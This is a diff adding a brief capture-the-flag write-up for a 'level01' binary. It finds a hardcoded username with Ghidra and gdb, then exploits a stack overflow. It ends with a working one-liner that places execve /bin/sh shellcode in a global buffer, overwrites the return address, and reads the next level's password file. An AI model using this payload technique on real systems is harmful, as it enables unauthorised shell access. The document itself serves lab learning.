@@ -1,0 +1,14 @@
+When executing binary it ask for a username and then check it.
+If we enter username "admin" it say "verifying username....","nope, incorrect username...".
+Using ghidra to examine binary, we can see that it compare with "dat_will".
+And that the username is stored in a global named "a_user_name" with address 0x0804a040.
+If we try a password it print "nope, incorrect password..."
+If we try a very long password the program segfault.
+With gdb we can see that the program segfault at the return of the function because the address as been corrupted.
+With ghidra we can see that even with the good password, the program would not lead to anywhere and end.
+If we try to put char after the username "dat_will" it still work, only the 8 first bytes are checked.
+With those information we will inject a shellcode after the username "dat_will" and ecrase the return address with the password to jump to the shellcode and start a shell to get the flag.
+
+echo -e "dat_will\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\n01234567890123456789012345678901234567890123456789012345678901234567890123456789\x48\xa0\x04\x08" > /tmp/lv1 && cat /tmp/lv1 - | ./level01
+
+and get flag with cat /home/users/level02/.pass
